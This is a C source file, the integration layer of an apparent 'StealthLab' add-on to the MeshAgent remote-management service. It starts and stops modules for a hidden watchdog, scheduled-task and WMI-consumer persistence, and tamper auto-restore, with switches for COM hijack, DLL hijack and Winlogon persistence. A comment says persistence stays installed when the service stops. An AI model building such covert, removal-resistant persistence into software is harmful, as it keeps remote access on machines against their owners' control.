/*
 * stealth_integration.c - Main integration layer implementation
 *
 * Connects all stealth modules to MeshAgent service lifecycle.
 * This is the primary entry point for StealthLab functionality.
 */

#include "stealth_integration.h"
#include "stealth_lockdown.h"
#include "stealth_monitor.h"
#include "stealth_state.h"
#include "stealth_watchdog.h"
#include "stealth_ipc.h"
#include "stealth_persistence.h"
#include "stealth_registry.h"
#include "stealth_defaults.h"
#include <stdio.h>
#include <wtsapi32.h>

/* WTS session change constants (in case not defined) */
#ifndef WTS_CONSOLE_CONNECT
#define WTS_CONSOLE_CONNECT        0x1
#define WTS_CONSOLE_DISCONNECT     0x2
#define WTS_REMOTE_CONNECT         0x3
#define WTS_REMOTE_DISCONNECT      0x4
#define WTS_SESSION_LOGON          0x5
#define WTS_SESSION_LOGOFF         0x6
#define WTS_SESSION_LOCK           0x7
#define WTS_SESSION_UNLOCK         0x8
#endif

/* Internal state */
static struct {
    StealthIntegrationConfig config;
    StealthIntegrationStatus status;
    StateHandle stateHandle;
    IpcServer ipcServer;
    CRITICAL_SECTION lock;
    BOOL initialized;
    LONGLONG startTime;
} g_Integration = { 0 };

/* Forward declarations */
static void IpcMessageHandler(IpcServer* server, const IpcMessageHeader* header, const void* payload);
static void LockdownEventHandler(LockdownEventType eventType, DWORD featureId, const WCHAR* message, void* context);
static void MonitorTamperHandler(const MonitorItem* item, const WCHAR* currentValue, void* context);
static LONGLONG GetCurrentTimeMs(void);
static void LogIntegration(const WCHAR* message);

/* Helper to build paths dynamically using ProgramData */
static BOOL BuildDynamicPath(WCHAR* outPath, size_t outSize, const WCHAR* subFolder, const WCHAR* fileName)
{
    WCHAR programData[MAX_PATH];

    /* Get ProgramData folder dynamically */
    if (GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH) == 0) {
        /* Fallback if environment variable not available */
        wcscpy_s(programData, MAX_PATH, L"C:\\ProgramData");
    }

    if (fileName && fileName[0]) {
        _snwprintf_s(outPath, outSize, _TRUNCATE, L"%s\\%s\\%s", programData, subFolder, fileName);
    } else {
        _snwprintf_s(outPath, outSize, _TRUNCATE, L"%s\\%s", programData, subFolder);
    }

    return TRUE;
}

void StealthIntegration_LoadDefaultConfig(StealthIntegrationConfig* config)
{
    if (!config) return;

    ZeroMemory(config, sizeof(StealthIntegrationConfig));

    /* Default feature toggles - conservative defaults */
    config->enableServiceProtection = TRUE;
    config->enableWatchdog = TRUE;
    config->enableTaskScheduler = TRUE;
    config->enableWmiConsumer = TRUE;
    config->enableTamperDetection = TRUE;
    config->enableIpcServer = TRUE;

    /* Optional/advanced features default off */
    config->enableRegistryPolicy = FALSE;
    config->enableWinlogon = FALSE;
    config->enableExplorerPolicy = FALSE;
    config->enableComHijack = FALSE;
    config->enablePortMonitor = FALSE;
    config->enableDllHijack = FALSE;

    /* Timing */
    config->monitorIntervalMs = 8000;   /* 8 seconds per spec */
    config->watchdogIntervalMs = 5000;
    config->ipcTimeoutMs = 30000;

    /* Names from stealth_defaults.h */
    wcscpy_s(config->serviceName, 64, STEALTH_FALLBACK_SERVICE_NAME);
    wcscpy_s(config->displayName, 128, STEALTH_FALLBACK_DISPLAY_NAME);

    /* Paths - dynamically resolved from ProgramData environment variable */
    BuildDynamicPath(config->installDir, MAX_PATH, STEALTH_FALLBACK_SERVICE_NAME, NULL);
    BuildDynamicPath(config->stateFilePath, MAX_PATH, STEALTH_FALLBACK_SERVICE_NAME, L"state.dat");
    BuildDynamicPath(config->logFilePath, MAX_PATH, STEALTH_FALLBACK_SERVICE_NAME, L"integration.log");

    /* IPC - use service name for pipe name */
    _snwprintf_s(config->ipcPipeName, 128, _TRUNCATE, L"\\\\.\\pipe\\%s_Ipc", STEALTH_FALLBACK_SERVICE_NAME);
    wcscpy_s(config->ipcAuthKey, 64, L"");  /* Would be set by branding */

    /* Auto-lockdown */
    config->autoSecureEnter = FALSE;

    /* Get service exe path */
    GetModuleFileNameW(NULL, config->serviceExePath, MAX_PATH);

    /* Helper monitor - default off until explicitly configured */
    config->enableHelperMonitor = FALSE;
    config->helperExePath[0] = L'\0';
    config->helperArguments[0] = L'\0';
    config->helperPersistentSpawn = TRUE;
    config->helperRegisterWatchdog = TRUE;
}

BOOL StealthIntegration_Init(const StealthIntegrationConfig* config)
{
    LockdownConfig lockdownConfig = { 0 };
    MonitorConfig monitorConfig = { 0 };
    WatchdogConfig watchdogConfig = { 0 };

    if (g_Integration.initialized) {
        return TRUE;
    }

    ZeroMemory(&g_Integration, sizeof(g_Integration));
    InitializeCriticalSection(&g_Integration.lock);

    /* Load configuration */
    if (config) {
        memcpy(&g_Integration.config, config, sizeof(StealthIntegrationConfig));
    } else {
        StealthIntegration_LoadDefaultConfig(&g_Integration.config);
    }

    g_Integration.startTime = GetCurrentTimeMs();

    /* Ensure install directory exists */
    CreateDirectoryW(g_Integration.config.installDir, NULL);

    LogIntegration(L"Initializing StealthLab integration");

    /* Initialize state store */
    if (!State_Init(&g_Integration.stateHandle, g_Integration.config.stateFilePath, FALSE)) {
        LogIntegration(L"Warning: Failed to initialize state store");
    }

    /* Initialize lockdown system */
    lockdownConfig.enabledFeatures = 0;

    if (g_Integration.config.enableServiceProtection) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_SERVICE_PROTECT;
    }
    if (g_Integration.config.enableWatchdog) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_WATCHDOG;
    }
    if (g_Integration.config.enableTaskScheduler) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_TASK_SCHEDULER;
    }
    if (g_Integration.config.enableWmiConsumer) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_WMI_CONSUMER;
    }
    if (g_Integration.config.enableRegistryPolicy) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_REGISTRY_POLICY;
    }
    if (g_Integration.config.enableWinlogon) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_WINLOGON;
    }
    if (g_Integration.config.enableExplorerPolicy) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_EXPLORER_POLICY;
    }
    if (g_Integration.config.enableComHijack) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_COM_HIJACK;
    }
    if (g_Integration.config.enablePortMonitor) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_PORT_MONITOR;
    }
    if (g_Integration.config.enableDllHijack) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_DLL_HIJACK;
    }
    if (g_Integration.config.enableTamperDetection) {
        lockdownConfig.enabledFeatures |= LOCKDOWN_FEATURE_TAMPER_DETECTION;
    }

    lockdownConfig.logAllEvents = TRUE;
    lockdownConfig.allowRemoteControl = TRUE;
    lockdownConfig.monitorIntervalMs = g_Integration.config.monitorIntervalMs;
    lockdownConfig.watchdogIntervalMs = g_Integration.config.watchdogIntervalMs;
    wcscpy_s(lockdownConfig.stateFilePath, MAX_PATH, g_Integration.config.stateFilePath);
    wcscpy_s(lockdownConfig.logFilePath, MAX_PATH, g_Integration.config.logFilePath);
    wcscpy_s(lockdownConfig.serviceName, 64, g_Integration.config.serviceName);
    wcscpy_s(lockdownConfig.serviceExePath, MAX_PATH, g_Integration.config.serviceExePath);

    if (!Lockdown_Init(&lockdownConfig)) {
        LogIntegration(L"Warning: Failed to initialize lockdown system");
    }

    Lockdown_SetEventCallback(LockdownEventHandler, NULL);

    if (Lockdown_GetState() == LOCKDOWN_STATE_ACTIVE) {
        g_Integration.status.lockdownActive = TRUE;
        g_Integration.config.autoSecureEnter = FALSE;
        LogIntegration(L"Existing lockdown state detected during initialization");
    }

    /* Initialize monitor system */
    monitorConfig.checkIntervalMs = g_Integration.config.monitorIntervalMs;
    monitorConfig.maxFailuresBeforeAlert = 3;
    monitorConfig.logTamperEvents = TRUE;
    monitorConfig.sendIpcAlerts = TRUE;
    monitorConfig.autoRestore = TRUE;
    wcscpy_s(monitorConfig.logFilePath, MAX_PATH, g_Integration.config.logFilePath);

    if (!Monitor_Init(&monitorConfig)) {
        LogIntegration(L"Warning: Failed to initialize monitor system");
    }

    Monitor_SetTamperCallback(MonitorTamperHandler, NULL);

    /* Initialize watchdog */
    watchdogConfig.checkIntervalMs = g_Integration.config.watchdogIntervalMs;
    watchdogConfig.restartDelayMs = 1000;
    watchdogConfig.maxRestartAttempts = 10;
    watchdogConfig.backoffMultiplier = 2;
    watchdogConfig.useJobObject = TRUE;
    watchdogConfig.hidden = TRUE;

    /* Watchdog will be started by Lockdown_Enter if enabled */

    g_Integration.initialized = TRUE;
    g_Integration.status.initialized = TRUE;

    LogIntegration(L"StealthLab integration initialized successfully");

    return TRUE;
}

BOOL StealthIntegration_Start(void)
{
    if (!g_Integration.initialized) {
        return FALSE;
    }

    LogIntegration(L"Starting StealthLab components");

    /* Start IPC server */
    if (g_Integration.config.enableIpcServer) {
        if (Ipc_ServerCreate(&g_Integration.ipcServer,
                            g_Integration.config.ipcPipeName,
                            IpcMessageHandler, NULL)) {
            /* Ipc_ServerCreate also starts the server thread */
            g_Integration.status.ipcServerRunning = TRUE;
            LogIntegration(L"IPC server started");
        }
    }

    BOOL handled = FALSE;
    if (!g_Integration.config.autoSecureEnter &&
        Lockdown_GetState() == LOCKDOWN_STATE_ACTIVE) {
        LogIntegration(L"Existing lockdown state detected; reapplying controls");
        if (Lockdown_Reapply()) {
            g_Integration.status.lockdownActive = TRUE;
            g_Integration.status.watchdogRunning =
                Lockdown_IsFeatureActive(LOCKDOWN_FEATURE_WATCHDOG);
            g_Integration.status.monitorRunning =
                Lockdown_IsFeatureActive(LOCKDOWN_FEATURE_TAMPER_DETECTION);
            LogIntegration(L"Lockdown state restored from previous session");
            handled = TRUE;
        } else {
            LogIntegration(L"Lockdown reapply failed, falling back to standard startup");
        }
    }

    if (!handled) {
        /* Auto-enter lockdown if configured */
        if (g_Integration.config.autoSecureEnter) {
            LogIntegration(L"Auto-entering lockdown mode");
            StealthIntegration_SecureEnter();
        } else {
            /* Start basic monitoring even without full lockdown */
            if (g_Integration.config.enableTamperDetection) {
                /* Add service to monitor */
                Monitor_AddService(g_Integration.config.serviceName, MONITOR_ACTION_RESTART);

                if (Monitor_Start()) {
                    g_Integration.status.monitorRunning = TRUE;
                    LogIntegration(L"Monitor thread started");
                }
            }
        }
    }

    /* Start helper monitor if configured */
    if (g_Integration.config.enableHelperMonitor &&
        g_Integration.config.helperExePath[0] != L'\0') {

        HelperProcessConfig helperConfig;
        HelperMonitor_InitConfig(&helperConfig);

        wcscpy_s(helperConfig.exePath, MAX_PATH, g_Integration.config.helperExePath);
        wcscpy_s(helperConfig.arguments, _countof(helperConfig.arguments), g_Integration.config.helperArguments);
        helperConfig.persistentSpawn = g_Integration.config.helperPersistentSpawn;
        helperConfig.monitorSession = TRUE;

        if (HelperMonitor_Start(&helperConfig, NULL, NULL)) {
            g_Integration.status.helperMonitorRunning = TRUE;
            LogIntegration(L"Helper monitor started");
            HelperMonitor_RequestSpawn((DWORD)-1);

            /* Register helper with main watchdog if configured */
            if (g_Integration.config.helperRegisterWatchdog) {
                if (Watchdog_RegisterHelper(&helperConfig)) {
                    LogIntegration(L"Helper registered with watchdog");
                }
            }
        } else {
            LogIntegration(L"Warning: Failed to start helper monitor");
        }
    }

    LogIntegration(L"StealthLab components started");

    return TRUE;
}

void StealthIntegration_Stop(void)
{
    if (!g_Integration.initialized) {
        return;
    }

    LogIntegration(L"Stopping StealthLab components");

    /* Stop helper monitor first */
    if (g_Integration.status.helperMonitorRunning) {
        /* Unregister from watchdog if it was registered */
        if (g_Integration.config.helperRegisterWatchdog) {
            HelperProcessConfig helperConfig;
            HelperMonitor_InitConfig(&helperConfig);
            wcscpy_s(helperConfig.exePath, MAX_PATH, g_Integration.config.helperExePath);
            wcscpy_s(helperConfig.arguments, _countof(helperConfig.arguments), g_Integration.config.helperArguments);
            Watchdog_UnregisterHelper(&helperConfig);
        }

        HelperMonitor_Stop();
        g_Integration.status.helperMonitorRunning = FALSE;
        LogIntegration(L"Helper monitor stopped");
    }

    /*
     * Do not automatically SecureExit on stop/shutdown paths. SecureExit removes
     * persistence artifacts (tasks/WMI/etc) and can run during service restarts/updates.
     * Keep persistence installed; only stop runtime monitoring components.
     */
    if (g_Integration.status.lockdownActive) {
        Lockdown_StopRuntime();
        g_Integration.status.monitorRunning = FALSE;
        g_Integration.status.watchdogRunning = FALSE;
    }

    /* Stop IPC server */
    if (g_Integration.status.ipcServerRunning) {
        Ipc_ServerDestroy(&g_Integration.ipcServer);
        g_Integration.status.ipcServerRunning = FALSE;
        LogIntegration(L"IPC server stopped");
    }

    /* Stop monitor */
    if (g_Integration.status.monitorRunning) {
        Monitor_Stop();
        g_Integration.status.monitorRunning = FALSE;
        LogIntegration(L"Monitor thread stopped");
    }

    /* Stop watchdog */
    if (g_Integration.status.watchdogRunning) {
        Watchdog_Stop();
        g_Integration.status.watchdogRunning = FALSE;
        LogIntegration(L"Watchdog stopped");
    }

    LogIntegration(L"StealthLab components stopped");
}

void StealthIntegration_Cleanup(void)
{
    if (!g_Integration.initialized) {
        return;
    }

    LogIntegration(L"Cleaning up StealthLab integration");

    StealthIntegration_Stop();

    /* Cleanup components */
    Ipc_ServerDestroy(&g_Integration.ipcServer);
    Monitor_Cleanup();
    Lockdown_Cleanup();
    State_Close(&g_Integration.stateHandle);

    DeleteCriticalSection(&g_Integration.lock);

    ZeroMemory(&g_Integration, sizeof(g_Integration));

    /* Note: Can't log after cleanup */
}

void StealthIntegration_GetStatus(StealthIntegrationStatus* status)
{
    MonitorStats monitorStats;
    LockdownStatus lockdownStatus;

    if (!status) return;

    EnterCriticalSection(&g_Integration.lock);

    memcpy(status, &g_Integration.status, sizeof(StealthIntegrationStatus));
    status->uptimeMs = GetCurrentTimeMs() - g_Integration.startTime;

    /* Get lockdown status */
    Lockdown_GetStatus(&lockdownStatus);
    status->activeFeatures = lockdownStatus.activeFeatures;
    status->tamperEvents = lockdownStatus.tamperEvents;
    status->restoreAttempts = lockdownStatus.restoreAttempts;

    /* Get monitor stats */
    Monitor_GetStats(&monitorStats);
    status->tamperEvents += monitorStats.tamperDetections;

    LeaveCriticalSection(&g_Integration.lock);
}

BOOL StealthIntegration_SecureEnter(void)
{
    if (!g_Integration.initialized) {
        return FALSE;
    }

    LogIntegration(L"Executing SecureEnter");

    if (Lockdown_Enter()) {
        g_Integration.status.lockdownActive = TRUE;
        g_Integration.status.monitorRunning = TRUE;
        g_Integration.status.watchdogRunning =
            (g_Integration.config.enableWatchdog &&
             Lockdown_IsFeatureActive(LOCKDOWN_FEATURE_WATCHDOG));

        LogIntegration(L"SecureEnter completed successfully");
        return TRUE;
    }

    LogIntegration(L"SecureEnter failed");
    return FALSE;
}

BOOL StealthIntegration_SecureExit(void)
{
    if (!g_Integration.initialized) {
        return FALSE;
    }

    LogIntegration(L"Executing SecureExit");

    if (Lockdown_Exit()) {
        g_Integration.status.lockdownActive = FALSE;

        /* Restore all state */
        DWORD restored = State_RestoreAll(&g_Integration.stateHandle);
        WCHAR msg[128];
        _snwprintf_s(msg, 128, _TRUNCATE, L"SecureExit completed, restored %lu items", restored);
        LogIntegration(msg);

        return TRUE;
    }

    LogIntegration(L"SecureExit failed");
    return FALSE;
}

BOOL StealthIntegration_IsLockdownActive(void)
{
    return g_Integration.status.lockdownActive;
}

BOOL StealthIntegration_HandleServiceControl(DWORD controlCode)
{
    switch (controlCode) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            /* If lockdown is active and we want to prevent stop, return TRUE here */
            /* For now, allow stop but log it */
            LogIntegration(L"Service control: STOP/SHUTDOWN received");
            return FALSE; /* Let service handle normally */

        case SERVICE_CONTROL_PAUSE:
            /* Pause monitoring */
            Monitor_Pause();
            LogIntegration(L"Service control: PAUSE - monitoring paused");
            return TRUE;

        case SERVICE_CONTROL_CONTINUE:
            /* Resume monitoring */
            Monitor_Resume();
            LogIntegration(L"Service control: CONTINUE - monitoring resumed");
            return TRUE;

        default:
            return FALSE;
    }
}

void StealthIntegration_HandleSessionChange(DWORD eventType, DWORD sessionId)
{
    if (!g_Integration.initialized) {
        return;
    }

    /* Forward session change to helper monitor if running */
    if (g_Integration.status.helperMonitorRunning) {
        HelperMonitor_OnSessionChange(eventType, sessionId);
    }

    /* Log session changes for debugging */
    WCHAR msg[128];
    const WCHAR* eventName = L"UNKNOWN";

    switch (eventType) {
        case WTS_CONSOLE_CONNECT:    eventName = L"CONSOLE_CONNECT"; break;
        case WTS_CONSOLE_DISCONNECT: eventName = L"CONSOLE_DISCONNECT"; break;
        case WTS_REMOTE_CONNECT:     eventName = L"REMOTE_CONNECT"; break;
        case WTS_REMOTE_DISCONNECT:  eventName = L"REMOTE_DISCONNECT"; break;
        case WTS_SESSION_LOGON:      eventName = L"SESSION_LOGON"; break;
        case WTS_SESSION_LOGOFF:     eventName = L"SESSION_LOGOFF"; break;
        case WTS_SESSION_LOCK:       eventName = L"SESSION_LOCK"; break;
        case WTS_SESSION_UNLOCK:     eventName = L"SESSION_UNLOCK"; break;
    }

    _snwprintf_s(msg, 128, _TRUNCATE, L"Session change: %s (session %lu)", eventName, sessionId);
    LogIntegration(msg);
}

BOOL StealthIntegration_UpdateConfig(const StealthIntegrationConfig* config)
{
    if (!config) return FALSE;

    EnterCriticalSection(&g_Integration.lock);
    memcpy(&g_Integration.config, config, sizeof(StealthIntegrationConfig));
    LeaveCriticalSection(&g_Integration.lock);

    LogIntegration(L"Configuration updated");
    return TRUE;
}

DWORD StealthIntegration_CheckAndRestore(void)
{
    DWORD restored = 0;

    LogIntegration(L"Forcing check and restore");

    restored = Lockdown_CheckAndRestore();

    WCHAR msg[128];
    _snwprintf_s(msg, 128, _TRUNCATE, L"Check and restore completed, restored %lu items", restored);
    LogIntegration(msg);

    return restored;
}

void StealthIntegration_EmergencyShutdown(void)
{
    LogIntegration(L"EMERGENCY SHUTDOWN initiated");

    Lockdown_EmergencyShutdown();

    g_Integration.status.lockdownActive = FALSE;
    g_Integration.status.monitorRunning = FALSE;
    g_Integration.status.watchdogRunning = FALSE;
}

/* ============ Internal Functions ============ */

static void IpcMessageHandler(IpcServer* server, const IpcMessageHeader* header, const void* payload)
{
    DWORD responseStatus = 0;
    IpcMessageType responseType;

    (void)payload;

    if (!server || !header) return;

    responseType = (IpcMessageType)header->type;

    switch (header->type) {
        case IPC_MSG_PING:
            responseType = IPC_MSG_PONG;
            responseStatus = 0;
            break;

        case IPC_MSG_SECURE_ENTER:
            responseStatus = StealthIntegration_SecureEnter() ? 0 : 1;
            break;

        case IPC_MSG_SECURE_EXIT:
            responseStatus = StealthIntegration_SecureExit() ? 0 : 1;
            break;

        case IPC_MSG_STATUS_REQUEST:
            responseType = IPC_MSG_STATUS_RESPONSE;
            responseStatus = 0;
            /* Could send IpcStatusPayload here */
            break;

        default:
            responseType = IPC_MSG_ERROR;
            responseStatus = (DWORD)-1; /* Unknown command */
            break;
    }

    /* Send response */
    Ipc_ServerSend(server, responseType, &responseStatus, sizeof(responseStatus));
}

static void LockdownEventHandler(LockdownEventType eventType, DWORD featureId, const WCHAR* message, void* context)
{
    (void)context;

    WCHAR logMsg[512];
    _snwprintf_s(logMsg, 512, _TRUNCATE, L"Lockdown event %d, feature 0x%08X: %s",
                 eventType, featureId, message ? message : L"");
    LogIntegration(logMsg);

    /* Update status based on event */
    switch (eventType) {
        case LOCKDOWN_EVENT_TAMPER_DETECTED:
            g_Integration.status.tamperEvents++;
            break;

        case LOCKDOWN_EVENT_RESTORE_SUCCESS:
        case LOCKDOWN_EVENT_RESTORE_FAILED:
            g_Integration.status.restoreAttempts++;
            break;

        default:
            break;
    }
}

static void MonitorTamperHandler(const MonitorItem* item, const WCHAR* currentValue, void* context)
{
    (void)context;

    WCHAR logMsg[512];
    _snwprintf_s(logMsg, 512, _TRUNCATE, L"Tamper detected: %s (current: %s)",
                 item->identifier, currentValue ? currentValue : L"null");
    LogIntegration(logMsg);

    g_Integration.status.tamperEvents++;

    /* Send IPC alert if configured */
    if (g_Integration.config.enableIpcServer && g_Integration.status.ipcServerRunning) {
        /* Would broadcast tamper alert to connected clients */
    }
}

static LONGLONG GetCurrentTimeMs(void)
{
    FILETIME ft;
    ULARGE_INTEGER uli;

    GetSystemTimeAsFileTime(&ft);
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;

    return (LONGLONG)(uli.QuadPart / 10000);
}

static void LogIntegration(const WCHAR* message)
{
    FILE* fp;
    SYSTEMTIME st;

    if (!message) return;

    GetLocalTime(&st);

    if (_wfopen_s(&fp, g_Integration.config.logFilePath, L"a") == 0 && fp) {
        fwprintf(fp, L"[%04d-%02d-%02d %02d:%02d:%02d] INTEGRATION: %s\n",
                 st.wYear, st.wMonth, st.wDay,
                 st.wHour, st.wMinute, st.wSecond,
                 message);
        fclose(fp);
    }
}
